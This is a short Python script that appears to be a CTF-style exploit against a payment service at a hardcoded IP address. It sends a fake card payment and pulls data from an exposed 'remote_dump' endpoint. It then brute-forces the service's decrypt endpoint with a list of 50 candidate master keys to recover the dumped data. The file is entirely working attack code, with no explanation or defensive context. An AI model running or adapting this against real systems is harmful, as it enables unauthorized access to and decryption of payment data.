import requests
import random
import json
from urllib.parse import urlparse
possible_keys = [
    "38AECDB7266150C463D6B61927C1E6D9A840F7014F9276E91BD325D7A881EFF2",
    "0E16A996605DA9FBBC1E4267F7103F826CA796018B6E24590F8A39ABC6F4F0D5",
    "6823ED3829E3BB04BCD320481CAFE5035E64C16F1360E9CC5766DAE073127C86",
    "7A8E8BC865430392742275023384F1734E01045E71245DD97FD27470557FB135",
    "92C762D770F881CD4127412CE325FA42D1BA300C0878D2EC0A078645E3CEBC51",
    "99018FF15011FD01933497E10EBC453063CF9AEB0344883AD67BD9E79147A222",
    "7703148266F20E0FAB3BE71C3E0A331D98913EC826EBFB76ADF324471103AAFF",
    "50548D4A1696B1F8007E436C231BEC39674A13E64A854AF2434224560058FB75",
    "3C6301935D2418B1F4859CFA1268E363203E18062F23A4C2C6E1517103BF570E",
    "86EFE6A481590C5208AFCB8ADDE4E9FE97B9626BDDF6AF47BC0F90370DB5792C",
    "9B7710C5C6341D53B7E40FF189947EC670F717A7DEABAEE3E8C84214E93D1C6F",
    "E082BE2CE04BC6136385EE36168CBE3449F8753ABB30DB5E56C385A96DCF97F3",
    "8DE7A7C6ADF9D20A0E4689D8D7083815D85F0EE3ADC0D02B9264C10F238E19C7",
    "F92D0E3881705EAFD026DDA26AD3E16F5CDD6C3DED7EDD708AFF1BFDCBF47D8C",
    "B64BBBB588BA1318B78D95BD6484E7C5FB8401FD0587DDB23FD546865A6751CD",
    "F4966360FFCE5B00327868AF3400A9F1E9148F164043BEA2BE65206F314EF8F4",
    "BF2FE4CD0D71506D47DD2BCD02C6E1B92943EF1C98AEF38EE566AD70FFFDFA30",
    "728796AF9207D166E37A860EC23AADE36A287DEAD89FCA18565BEC4B4D1AA457",
    "BC709FCB6CF414E72CCFE36352FBF0EA5A1EDBA3ED04E4104E894580BF7270C8",
    "9CEC0D0B3FD8E0E1229C43B8C9A6AE7C36E440258F0875B6F28BBE02D88A52B3",
    "F9A0DE31020DEE6FAA357B1802FA8D24D7CB25C16510226468CF646066C668DB",
    "D3D9B9DDFC15790EA225702812EDD6562546265583384B61E22E37247CAE62F9",
    "B16E85152DF8E5B39742268C179D70265FD15476351E2AF87FEC7B0F4B9B7D20",
    "C453418EDCFC0F7B469B190AF3B72C045591F9445ECE00C81E0B807DF22A10C7",
    "1297F1FEA773E25B0CAE42929164DC5DD6CA89602A5A4306C8CAF7F771BEB375",
    "91F8FD0D9CD5FB97A7E32F8CDBE1DAA94D088F17C07EC1DFDC50CA01EBC8F1AB",
    "9FCBAE5F5081559CEE0026BF6F1B3166F578CCC6BCC8168E56A8A872DBE2E1C0",
    "E8E93DF73A51D858B7701552AAC7E20847FBD838510181186A6C8D18D02DFB13",
    "C65E58EFFF4ADEDD0D42C1D8F1C57636824C9955B233237B91602AE06010EB18",
    "F881E91C49F75B5EFC26F995A73B930C79D9B4017F9D167CE0E58671B1CBE105",
    "69BE9C4657B93BED4676FC9270B9BA60D5205436CFD94DADB2450E7E71CDBB88",
    "ECAFB2B4840F1FC3B7F97DAD6035F286FBAD6770DBC50B01B8DB0252540E081B",
    "B071A1E4A6C71307DF98A2B094A74F18E378351D4D560A9AFB44020BAD859B8A",
    "0B4A011CC4667405EE97427F1A8F5DDBA5899D2C72937636F1007EB66ACD3E86",
    "B2A3378E733FC6AEE6A2F28353799AC4D3E7D46D30B7F250C9DBD3441D9B460A",
    "4CBC96099A6467CE002461F10549B4898265EBE6188B45EFACC44293516E62C4",
    "A278DBA1A5267A649F05E8AD3A89C65AFF9F3330ECF50B0A60546C447F0EF370",
    "CC0891F6304D8D3E1B74467C909245D7A68A305DC2B844CB9AE4875D5785D8A8",
    "81EA8A6D2DA66051AC8FEEA8FFC723A358F63B5D07752C1C4C1C44160BE9072C",
    "9F7D9303A02CB3A6BFAB20CAAAF411DCA9695E09A01295064D8F86B75455A4B7",
    "A5AD047862F19440D316C07EE6BC458031B1CC809747DF11697577AEFC693E7C",
    "AB87A52B90AAC117E33EA5805EFB50286F8F47822AA62A337568A87BDB23F672",
    "3EDC58AB4733B37392255F2117F37FC03811C65615EE7DED68B99BEF63292D88",
    "9A67CEFACA741495FDA355974CC8EB6325ECB5FC5EE2D99A461031641728802A",
    "FA0120474E3736EB52DFA8B77BE17591F5261DB3C0BA2552F31638077B323BB5",
    "B9F5053658AF06E2EC45796D28030D0D995A9F5BD671835C5304AD1A733432EE",
    "CA357B93C4352B547E18E7B7154A8D25B84163C96A7F94C307232A1B86A78DD2",
    "306E9426D794F2F6C46362B507B06062A380E1A834952FCF7751686301182A06",
    "B936D16AEDF1733C43424820EF2F5AD7AA988E98B4A3DAE059AF941616E2407D",
    "75A4A98D431D00C25AAA0E8EF4A737501F5BFEE1CE27C8DCD986608FFAD6F70D",
 ]

BACK_PORT = 7000
FRONT_PORT = 8080
redis_host = host = '144.76.26.107'

def build_payment(goods, cvv):
    return {
      'amount': sum([g['price'] for g in goods]),
      'items': goods,
      'order_id': random.randint(100000, 999999),
      'card': {
        'pan': "2222405343248877",
        'exp_date_month': "01",
        'exp_date_year': "25",
        'cardholder': "Ivan Ivanov",
        'cvv': cvv
      }
    }

items = [
    { "description": 'Fatty Doo Doo DVD', "price": 0.8 },
    { "description": 'Guzungas Gentlemans Magazine', "price": 0.7 },
    { "description": 'The Spirit of Christmas Film Reel', "price": 0.8 },
    { "description": 'VHS What Are These Changes? VHS', "price": 0.4 },
    { "description": 'What Happened To My School', "price": 1.0 },
    { "description": 'A Bowl of Craft Dinner', "price": 0.5 },
    { "description": 'Afghani Goat', "price": 4.0 },
    { "description": 'Alabama Man', "price": 0.5 },
    { "description": 'Antonio Banderas Love Doll', "price": 0.7 },
    { "description": 'Asses of Fire 2 poster', "price": 0.2 },
]

def send_payment_1(custom):
    endpoint = f"http://{host}:{BACK_PORT}/{custom}/payments"
    print(f"[ SENDPAYMENT ] set demo payment to {endpoint}")
    data = build_payment(
        goods=random.sample(items, random.randint(1, 6)),
        cvv=str(random.randint(100, 999))
    )
    response = requests.post(endpoint, json=data, headers={'Content-Type': 'application/json', 'Accept': 'application/json'})
    print(f"[ SENDPAYMENT ] payment data {data}")
    return response.text[14:-4]  # Assuming specific response formatting


terminal_key = "test_123"
send_payment_1(terminal_key)
url = f'http://{host}:{BACK_PORT}/remote_dump/'
print(url)
response = requests.get(url, verify=False)
print(response.status_code)
text = response.json()[0]
print(text)

for master_key in possible_keys:
    payload = json.dumps({
        "data": text,
        "masterkey": master_key,
    })
    print(payload)

    url = f'http://{host}:{BACK_PORT}/decrypt/'
    response = response = requests.post(url, data=payload, verify=False)
    print(response.status_code)
    print(response.text)

